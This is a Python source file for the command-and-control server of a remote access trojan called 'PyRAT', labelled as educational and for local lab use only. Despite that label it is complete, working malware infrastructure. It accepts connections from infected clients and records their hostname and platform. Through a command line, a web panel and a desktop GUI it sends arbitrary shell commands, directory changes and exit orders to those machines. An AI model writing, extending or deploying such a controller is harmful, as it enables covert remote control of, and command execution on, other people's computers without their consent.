#!/usr/bin/env python3
"""
Educational CNC (command-and-control) server for the simple RAT client.

This is a minimal text-based controller to experiment with the protocol in
`rat.py`. It is meant for LOCAL LAB USE ONLY and must not be used on any
system or network without explicit permission.

Usage (from the controlling machine):
    python cnc_server.py --host 0.0.0.0 --port 9001
    python cnc_server.py --mode web --host 0.0.0.0 --port 9001 --web-port 8080
    python cnc_server.py --mode gui --host 0.0.0.0 --port 9001

Then start one or more RAT clients pointing at this host/port.
You can type `help` at the server prompt for available commands.
"""

from __future__ import annotations

import argparse
import json
import os
import socket
import threading
from dataclasses import dataclass, field
from typing import Dict, Optional, Callable


JsonDict = Dict[str, object]


def send_json_line(sock: socket.socket, payload: JsonDict) -> None:
    data = (json.dumps(payload) + "\n").encode("utf-8", errors="ignore")
    sock.sendall(data)


def recv_json_line(sock: socket.socket) -> Optional[JsonDict]:
    chunks: list[bytes] = []
    while True:
        chunk = sock.recv(1)
        if not chunk:
            if not chunks:
                return None
            break
        if chunk == b"\n":
            break
        chunks.append(chunk)
    raw = b"".join(chunks).decode("utf-8", errors="ignore").strip()
    if not raw:
        return None
    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        return None


@dataclass
class ClientSession:
    id: int
    sock: socket.socket
    address: tuple[str, int]
    info: JsonDict = field(default_factory=dict)
    alive: bool = True
    last_response: JsonDict = field(default_factory=dict)


class CNCServer:
    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port
        self._next_id = 1
        self.clients: Dict[int, ClientSession] = {}
        self._lock = threading.Lock()
        self._listener: Optional[socket.socket] = None
        self._event_callbacks: list[Callable[[str, JsonDict], None]] = []

    # Listener and client management -------------------------------------------------

    def start(self) -> None:
        self._listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._listener.bind((self.host, self.port))
        self._listener.listen(5)
        print(f"[cnc] Listening on {self.host}:{self.port}")

        threading.Thread(target=self._accept_loop, daemon=True).start()

    def _accept_loop(self) -> None:
        assert self._listener is not None
        while True:
            try:
                client_sock, addr = self._listener.accept()
            except OSError:
                break
            with self._lock:
                cid = self._next_id
                self._next_id += 1
                session = ClientSession(id=cid, sock=client_sock, address=addr)
                self.clients[cid] = session
            print(f"[cnc] New client #{cid} from {addr[0]}:{addr[1]}")
            self._emit_event("client_connected", {"id": cid, "address": addr})
            threading.Thread(
                target=self._client_reader, args=(session,), daemon=True
            ).start()

    def _client_reader(self, session: ClientSession) -> None:
        sock = session.sock
        cid = session.id
        try:
            while True:
                msg = recv_json_line(sock)
                if msg is None:
                    print(f"[cnc] Client #{cid} disconnected")
                    self._emit_event("client_disconnected", {"id": cid})
                    break

                mtype = msg.get("type")
                if mtype == "hello":
                    session.info = msg
                    print(f"[cnc] Client #{cid} hello: {msg}")
                    self._emit_event("client_hello", {"id": cid, "info": msg})
                elif mtype == "heartbeat":
                    # Just log briefly; not essential.
                    pass
                else:
                    print(f"[cnc] From client #{cid}: {msg}")
                    session.last_response = msg
                    self._emit_event("client_response", {"id": cid, "response": msg})
        finally:
            session.alive = False
            with self._lock:
                if cid in self.clients:
                    del self.clients[cid]
            self._emit_event("client_removed", {"id": cid})
            try:
                sock.close()
            except OSError:
                pass

    def _emit_event(self, event_type: str, data: JsonDict) -> None:
        """Emit an event to all registered callbacks."""
        for callback in self._event_callbacks:
            try:
                callback(event_type, data)
            except Exception as e:
                print(f"[cnc] Error in event callback: {e}")

    def register_event_callback(self, callback: Callable[[str, JsonDict], None]) -> None:
        """Register a callback for server events."""
        self._event_callbacks.append(callback)

    # Command helpers ----------------------------------------------------------------

    def list_clients(self) -> None:
        with self._lock:
            if not self.clients:
                print("[cnc] No clients connected.")
                return
            for cid, session in self.clients.items():
                info = session.info
                host = info.get("hostname") if isinstance(info, dict) else None
                plat = info.get("platform") if isinstance(info, dict) else None
                cwd = info.get("cwd") if isinstance(info, dict) else None
                print(
                    f"  #{cid}: {session.address[0]}:{session.address[1]} "
                    f"host={host!r} platform={plat!r} cwd={cwd!r}"
                )

    def get_client(self, cid: int) -> Optional[ClientSession]:
        with self._lock:
            return self.clients.get(cid)


def run_cli(server: CNCServer) -> None:
    """
    Blocking command-line interface for interacting with clients.
    """
    help_text = """
Commands:
  help                  Show this help
  list                  List connected clients
  use <id>              Select a client to control
  ping                  Send a ping to the selected client
  exec <cmd>            Execute a shell command on the selected client
  cd <path>             Change working directory on the selected client
  pwd                   Print working directory on the selected client
  exit_client           Ask the selected client to exit
  quit                  Quit this CNC server
""".strip()

    selected_id: Optional[int] = None

    print(help_text)
    while True:
        prompt = "cnc"
        if selected_id is not None:
            prompt += f"(#{selected_id})"
        try:
            line = input(f"{prompt}> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[cnc] Quitting.")
            break

        if not line:
            continue

        parts = line.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""

        if cmd in ("help", "?"):
            print(help_text)
        elif cmd == "list":
            server.list_clients()
        elif cmd == "use":
            if not arg:
                print("Usage: use <id>")
                continue
            try:
                cid = int(arg)
            except ValueError:
                print("Client id must be an integer.")
                continue
            session = server.get_client(cid)
            if session is None:
                print(f"No client with id {cid}")
            else:
                selected_id = cid
                print(f"[cnc] Selected client #{cid}")
        elif cmd == "ping":
            if selected_id is None:
                print("No client selected. Use `list` and `use <id>` first.")
                continue
            session = server.get_client(selected_id)
            if session is None:
                print("Selected client is no longer connected.")
                selected_id = None
                continue
            send_json_line(session.sock, {"type": "ping"})
        elif cmd == "exec":
            if selected_id is None:
                print("No client selected. Use `list` and `use <id>` first.")
                continue
            if not arg:
                print("Usage: exec <shell command>")
                continue
            session = server.get_client(selected_id)
            if session is None:
                print("Selected client is no longer connected.")
                selected_id = None
                continue
            send_json_line(session.sock, {"type": "exec", "cmd": arg})
        elif cmd == "cd":
            if selected_id is None:
                print("No client selected. Use `list` and `use <id>` first.")
                continue
            if not arg:
                print("Usage: cd <path>")
                continue
            session = server.get_client(selected_id)
            if session is None:
                print("Selected client is no longer connected.")
                selected_id = None
                continue
            send_json_line(session.sock, {"type": "cd", "path": arg})
        elif cmd == "pwd":
            if selected_id is None:
                print("No client selected. Use `list` and `use <id>` first.")
                continue
            session = server.get_client(selected_id)
            if session is None:
                print("Selected client is no longer connected.")
                selected_id = None
                continue
            send_json_line(session.sock, {"type": "pwd"})
        elif cmd == "exit_client":
            if selected_id is None:
                print("No client selected. Use `list` and `use <id>` first.")
                continue
            session = server.get_client(selected_id)
            if session is None:
                print("Selected client is no longer connected.")
                selected_id = None
                continue
            send_json_line(session.sock, {"type": "exit"})
        elif cmd in ("quit", "q", "exit"):
            print("[cnc] Quitting.")
            break
        else:
            print("Unknown command. Type `help` for a list of commands.")


def load_config() -> JsonDict:
    """
    Load configuration from config.json in the same directory as this script,
    if it exists. Returns an empty dict if it cannot be loaded.
    """
    path = os.path.join(os.path.dirname(__file__), "config.json")
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except OSError:
        return {}
    except json.JSONDecodeError:
        return {}


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Educational CNC server for the simple RAT client.",
    )
    parser.add_argument(
        "--host",
        help="Host/IP to bind the CNC server to (overrides config.json if provided)",
    )
    parser.add_argument(
        "--port",
        type=int,
        help="TCP port to listen on (overrides config.json if provided)",
    )
    parser.add_argument(
        "--mode",
        choices=["cli", "web", "gui"],
        default="cli",
        help="Interface mode: cli (default), web, or gui",
    )
    parser.add_argument(
        "--web-port",
        type=int,
        default=8080,
        help="Port for web interface (default: 8080)",
    )
    parser.add_argument(
        "--web-host",
        default="127.0.0.1",
        help="Host for web interface (default: 127.0.0.1)",
    )
    return parser.parse_args()


def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
    """Run Flask web interface."""
    try:
        from flask import Flask, render_template_string, jsonify, request
        from flask_socketio import SocketIO, emit
    except ImportError:
        print("[cnc] ERROR: Flask and Flask-SocketIO are required for web mode.")
        print("[cnc] Install with: pip install flask flask-socketio")
        return

    app = Flask(__name__)
    app.config['SECRET_KEY'] = 'pyrat-educational-only'
    socketio = SocketIO(app, cors_allowed_origins="*")

    # HTML template
    HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>PyRAT CNC Server</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #e0e0e0; }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        h1 { color: #4CAF50; margin-bottom: 20px; }
        .section { background: #2a2a2a; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
        .clients-list { display: grid; gap: 10px; }
        .client-card { background: #333; padding: 15px; border-radius: 5px; border-left: 4px solid #4CAF50; }
        .client-card.selected { border-left-color: #2196F3; background: #3a3a3a; }
        .client-id { font-weight: bold; color: #4CAF50; font-size: 1.2em; }
        .client-info { margin-top: 10px; color: #aaa; font-size: 0.9em; }
        .controls { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 15px; }
        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 14px; }
        .btn-primary { background: #2196F3; color: white; }
        .btn-primary:hover { background: #1976D2; }
        .btn-danger { background: #f44336; color: white; }
        .btn-danger:hover { background: #d32f2f; }
        .btn-success { background: #4CAF50; color: white; }
        .btn-success:hover { background: #45a049; }
        input[type="text"] { padding: 10px; border: 1px solid #555; border-radius: 5px; background: #333; color: #e0e0e0; flex: 1; min-width: 200px; }
        .output { background: #1a1a1a; padding: 15px; border-radius: 5px; font-family: 'Courier New', monospace; font-size: 13px; max-height: 400px; overflow-y: auto; white-space: pre-wrap; word-wrap: break-word; }
        .status { padding: 10px; border-radius: 5px; margin-bottom: 15px; }
        .status.connected { background: #4CAF50; color: white; }
        .status.disconnected { background: #f44336; color: white; }
        .command-group { display: flex; gap: 10px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🐀 PyRAT CNC Server</h1>
        
        <div class="section">
            <div id="status" class="status disconnected">Disconnected</div>
            <div>Server: <strong id="server-info">-</strong></div>
        </div>

        <div class="section">
            <h2>Connected Clients</h2>
            <div id="clients-list" class="clients-list"></div>
        </div>

        <div class="section">
            <h2>Control Panel</h2>
            <div id="control-panel">
                <p style="color: #aaa;">Select a client to control</p>
            </div>
        </div>

        <div class="section">
            <h2>Output</h2>
            <div id="output" class="output"></div>
        </div>
    </div>

    <script>
        const socket = io();
        let selectedClientId = null;
        let clients = {};

        socket.on('connect', () => {
            document.getElementById('status').textContent = 'Connected';
            document.getElementById('status').className = 'status connected';
            socket.emit('get_clients');
        });

        socket.on('disconnect', () => {
            document.getElementById('status').textContent = 'Disconnected';
            document.getElementById('status').className = 'status disconnected';
        });

        socket.on('server_info', (data) => {
            document.getElementById('server-info').textContent = `${data.host}:${data.port}`;
        });

        socket.on('clients_update', (data) => {
            const oldCount = Object.keys(clients).length;
            clients = {};
            data.clients.forEach(client => {
                clients[client.id] = client;
            });
            const newCount = Object.keys(clients).length;
            if (newCount > oldCount) {
                addOutput(`[System] Client connected. Total clients: ${newCount}`);
            } else if (newCount < oldCount) {
                addOutput(`[System] Client disconnected. Total clients: ${newCount}`);
            }
            updateClientsList();
        });

        socket.on('client_response', (data) => {
            addOutput(`[Client #${data.id}] ${JSON.stringify(data.response, null, 2)}`);
        });

        // Periodic refresh as fallback
        setInterval(() => {
            socket.emit('get_clients');
        }, 2000);

        socket.on('command_result', (data) => {
            if (data.success) {
                addOutput(`[Success] ${data.message}`);
            } else {
                addOutput(`[Error] ${data.message}`);
            }
        });

        function updateClientsList() {
            const list = document.getElementById('clients-list');
            list.innerHTML = '';
            
            if (Object.keys(clients).length === 0) {
                list.innerHTML = '<p style="color: #aaa;">No clients connected</p>';
                return;
            }

            Object.values(clients).forEach(client => {
                const card = document.createElement('div');
                card.className = 'client-card' + (selectedClientId === client.id ? ' selected' : '');
                card.innerHTML = `
                    <div class="client-id">Client #${client.id}</div>
                    <div class="client-info">
                        <div>Address: ${client.address[0]}:${client.address[1]}</div>
                        <div>Hostname: ${client.info.hostname || 'N/A'}</div>
                        <div>Platform: ${client.info.platform || 'N/A'}</div>
                        <div>CWD: ${client.info.cwd || 'N/A'}</div>
                    </div>
                `;
                card.onclick = () => selectClient(client.id);
                list.appendChild(card);
            });
        }

        function selectClient(id) {
            selectedClientId = id;
            updateClientsList();
            updateControlPanel();
        }

        function updateControlPanel() {
            const panel = document.getElementById('control-panel');
            if (selectedClientId === null) {
                panel.innerHTML = '<p style="color: #aaa;">Select a client to control</p>';
                return;
            }

            panel.innerHTML = `
                <h3>Controlling Client #${selectedClientId}</h3>
                <div class="controls">
                    <button class="btn-primary" onclick="sendCommand('ping')">Ping</button>
                    <button class="btn-primary" onclick="sendCommand('pwd')">PWD</button>
                    <button class="btn-danger" onclick="sendCommand('exit')">Exit Client</button>
                </div>
                <div class="command-group">
                    <input type="text" id="exec-cmd" placeholder="Enter shell command..." onkeypress="if(event.key==='Enter') sendCommand('exec', document.getElementById('exec-cmd').value)">
                    <button class="btn-success" onclick="sendCommand('exec', document.getElementById('exec-cmd').value)">Execute</button>
                </div>
                <div class="command-group">
                    <input type="text" id="cd-path" placeholder="Enter directory path..." onkeypress="if(event.key==='Enter') sendCommand('cd', document.getElementById('cd-path').value)">
                    <button class="btn-success" onclick="sendCommand('cd', document.getElementById('cd-path').value)">Change Directory</button>
                </div>
            `;
        }

        function sendCommand(cmd, arg = '') {
            if (selectedClientId === null) {
                addOutput('[Error] No client selected');
                return;
            }
            socket.emit('command', {client_id: selectedClientId, command: cmd, argument: arg});
            addOutput(`[Command] Client #${selectedClientId}: ${cmd} ${arg}`);
        }

        function addOutput(text) {
            const output = document.getElementById('output');
            const time = new Date().toLocaleTimeString();
            output.textContent += `[${time}] ${text}\n`;
            output.scrollTop = output.scrollHeight;
        }

        window.sendCommand = sendCommand;
    </script>
</body>
</html>
    """

    @app.route('/')
    def index():
        return render_template_string(HTML_TEMPLATE)

    @socketio.on('connect')
    def handle_connect():
        emit('server_info', {'host': server.host, 'port': server.port})
        emit_clients_update()

    @socketio.on('get_clients')
    def handle_get_clients():
        emit_clients_update()

    @socketio.on('command')
    def handle_command(data):
        client_id = data.get('client_id')
        command = data.get('command')
        argument = data.get('argument', '')

        session = server.get_client(client_id)
        if session is None:
            emit('command_result', {'success': False, 'message': f'Client #{client_id} not found'})
            return

        try:
            if command == 'ping':
                send_json_line(session.sock, {"type": "ping"})
            elif command == 'exec':
                if not argument:
                    emit('command_result', {'success': False, 'message': 'Command required'})
                    return
                send_json_line(session.sock, {"type": "exec", "cmd": argument})
            elif command == 'cd':
                if not argument:
                    emit('command_result', {'success': False, 'message': 'Path required'})
                    return
                send_json_line(session.sock, {"type": "cd", "path": argument})
            elif command == 'pwd':
                send_json_line(session.sock, {"type": "pwd"})
            elif command == 'exit':
                send_json_line(session.sock, {"type": "exit"})
            else:
                emit('command_result', {'success': False, 'message': f'Unknown command: {command}'})
                return
            emit('command_result', {'success': True, 'message': f'Command {command} sent'})
        except Exception as e:
            emit('command_result', {'success': False, 'message': str(e)})

    def emit_clients_update():
        with server._lock:
            clients_data = []
            for cid, session in server.clients.items():
                clients_data.append({
                    'id': cid,
                    'address': session.address,
                    'info': session.info,
                    'alive': session.alive
                })
        # Emit from background thread - use app context and broadcast to all clients
        try:
            with app.app_context():
                socketio.emit('clients_update', {'clients': clients_data}, broadcast=True, namespace='/')
        except Exception as e:
            print(f"[cnc] Error emitting clients_update: {e}")

    def on_event(event_type: str, data: JsonDict):
        if event_type in ('client_connected', 'client_hello', 'client_disconnected', 'client_removed', 'client_response'):
            emit_clients_update()
        if event_type == 'client_response':
            try:
                with app.app_context():
                    socketio.emit('client_response', data, broadcast=True, namespace='/')
            except Exception as e:
                print(f"[cnc] Error emitting client_response: {e}")

    server.register_event_callback(on_event)

    print(f"[cnc] Web interface available at http://{web_host}:{web_port}")
    print(f"[cnc] Press Ctrl+C to stop")
    socketio.run(app, host=web_host, port=web_port, allow_unsafe_werkzeug=True)


def run_gui(server: CNCServer) -> None:
    """Run tkinter GUI interface."""
    try:
        import tkinter as tk
        from tkinter import ttk, scrolledtext, messagebox
    except ImportError:
        print("[cnc] ERROR: tkinter is required for GUI mode.")
        print("[cnc] tkinter should be included with Python, but may need to be installed separately on Linux.")
        return

    root = tk.Tk()
    root.title("PyRAT CNC Server")
    root.geometry("1000x700")
    root.configure(bg='#1a1a1a')

    style = ttk.Style()
    style.theme_use('clam')
    style.configure('TFrame', background='#1a1a1a')
    style.configure('TLabel', background='#1a1a1a', foreground='#e0e0e0')
    style.configure('TButton', padding=5)
    style.configure('TListbox', background='#2a2a2a', foreground='#e0e0e0')

    selected_id = tk.IntVar(value=0)

    # Top frame for clients
    top_frame = ttk.Frame(root, padding=10)
    top_frame.pack(fill=tk.BOTH, expand=True)

    ttk.Label(top_frame, text="Connected Clients", font=('Arial', 12, 'bold')).pack(anchor=tk.W)
    
    clients_frame = ttk.Frame(top_frame)
    clients_frame.pack(fill=tk.BOTH, expand=True, pady=5)

    clients_listbox = tk.Listbox(clients_frame, bg='#2a2a2a', fg='#e0e0e0', selectbackground='#4CAF50', font=('Courier', 10))
    clients_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    
    scrollbar = ttk.Scrollbar(clients_frame, orient=tk.VERTICAL, command=clients_listbox.yview)
    scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
    clients_listbox.config(yscrollcommand=scrollbar.set)

    def update_clients_list():
        clients_listbox.delete(0, tk.END)
        with server._lock:
            if not server.clients:
                clients_listbox.insert(tk.END, "No clients connected")
                return
            for cid, session in server.clients.items():
                info = session.info
                host = info.get("hostname", "N/A") if isinstance(info, dict) else "N/A"
                plat = info.get("platform", "N/A") if isinstance(info, dict) else "N/A"
                clients_listbox.insert(tk.END, f"#{cid}: {session.address[0]}:{session.address[1]} | {host} | {plat}")

    def on_client_select(event):
        selection = clients_listbox.curselection()
        if selection:
            line = clients_listbox.get(selection[0])
            if line.startswith("#"):
                try:
                    cid = int(line.split(":")[0][1:])
                    selected_id.set(cid)
                    status_label.config(text=f"Selected: Client #{cid}")
                except ValueError:
                    pass

    clients_listbox.bind('<<ListboxSelect>>', on_client_select)

    # Control frame
    control_frame = ttk.Frame(root, padding=10)
    control_frame.pack(fill=tk.X)

    status_label = ttk.Label(control_frame, text="No client selected", font=('Arial', 10))
    status_label.pack(side=tk.LEFT, padx=5)

    def send_command(cmd: str, arg: str = ""):
        cid = selected_id.get()
        if cid == 0:
            messagebox.showwarning("No Client", "Please select a client first")
            return
        
        session = server.get_client(cid)
        if session is None:
            messagebox.showerror("Error", f"Client #{cid} is no longer connected")
            selected_id.set(0)
            update_clients_list()
            return

        try:
            if cmd == "ping":
                send_json_line(session.sock, {"type": "ping"})
                output_text.insert(tk.END, f"[{cid}] Sent ping\n")
            elif cmd == "exec":
                if not arg:
                    messagebox.showwarning("Error", "Command required")
                    return
                send_json_line(session.sock, {"type": "exec", "cmd": arg})
                output_text.insert(tk.END, f"[{cid}] Executing: {arg}\n")
            elif cmd == "cd":
                if not arg:
                    messagebox.showwarning("Error", "Path required")
                    return
                send_json_line(session.sock, {"type": "cd", "path": arg})
                output_text.insert(tk.END, f"[{cid}] Changing directory: {arg}\n")
            elif cmd == "pwd":
                send_json_line(session.sock, {"type": "pwd"})
                output_text.insert(tk.END, f"[{cid}] Requesting PWD\n")
            elif cmd == "exit":
                send_json_line(session.sock, {"type": "exit"})
                output_text.insert(tk.END, f"[{cid}] Sent exit command\n")
        except Exception as e:
            messagebox.showerror("Error", str(e))
        output_text.see(tk.END)

    button_frame = ttk.Frame(control_frame)
    button_frame.pack(side=tk.RIGHT)

    ttk.Button(button_frame, text="Ping", command=lambda: send_command("ping")).pack(side=tk.LEFT, padx=2)
    ttk.Button(button_frame, text="PWD", command=lambda: send_command("pwd")).pack(side=tk.LEFT, padx=2)
    ttk.Button(button_frame, text="Exit Client", command=lambda: send_command("exit")).pack(side=tk.LEFT, padx=2)

    # Command input frame
    cmd_frame = ttk.Frame(root, padding=10)
    cmd_frame.pack(fill=tk.X)

    exec_entry = ttk.Entry(cmd_frame, width=40)
    exec_entry.pack(side=tk.LEFT, padx=5)
    exec_entry.bind('<Return>', lambda e: send_command("exec", exec_entry.get()))
    ttk.Button(cmd_frame, text="Execute", command=lambda: send_command("exec", exec_entry.get())).pack(side=tk.LEFT, padx=2)

    cd_entry = ttk.Entry(cmd_frame, width=30)
    cd_entry.pack(side=tk.LEFT, padx=5)
    cd_entry.bind('<Return>', lambda e: send_command("cd", cd_entry.get()))
    ttk.Button(cmd_frame, text="CD", command=lambda: send_command("cd", cd_entry.get())).pack(side=tk.LEFT, padx=2)

    # Output frame
    output_frame = ttk.Frame(root, padding=10)
    output_frame.pack(fill=tk.BOTH, expand=True)

    ttk.Label(output_frame, text="Output", font=('Arial', 10, 'bold')).pack(anchor=tk.W)
    output_text = scrolledtext.ScrolledText(output_frame, bg='#1a1a1a', fg='#e0e0e0', font=('Courier', 9), wrap=tk.WORD)
    output_text.pack(fill=tk.BOTH, expand=True, pady=5)

    def on_event(event_type: str, data: JsonDict):
        if event_type in ('client_hello', 'client_disconnected', 'client_removed'):
            root.after(0, update_clients_list)
        elif event_type == 'client_response':
            cid = data.get('id', 0)
            response = data.get('response', {})
            root.after(0, lambda: output_text.insert(tk.END, f"[{cid}] Response: {json.dumps(response, indent=2)}\n"))
            root.after(0, lambda: output_text.see(tk.END))

    server.register_event_callback(on_event)

    def refresh_clients():
        update_clients_list()
        root.after(1000, refresh_clients)

    refresh_clients()
    output_text.insert(tk.END, f"CNC Server running on {server.host}:{server.port}\n")
    output_text.insert(tk.END, "Select a client from the list to control it.\n")

    root.protocol("WM_DELETE_WINDOW", lambda: (root.quit(), root.destroy()))
    root.mainloop()


def main() -> None:
    cfg = load_config()
    server_cfg = cfg.get("server") if isinstance(cfg, dict) else {}

    args = parse_args()

    host = args.host or (server_cfg.get("host") if isinstance(server_cfg, dict) else None) or "0.0.0.0"
    port = args.port or int(
        (server_cfg.get("port") if isinstance(server_cfg, dict) else 9001)
    )

    server = CNCServer(host, port)
    server.start()

    if args.mode == "web":
        run_web(server, args.web_host, args.web_port)
    elif args.mode == "gui":
        run_gui(server)
    else:
        run_cli(server)


if __name__ == "__main__":
    main()


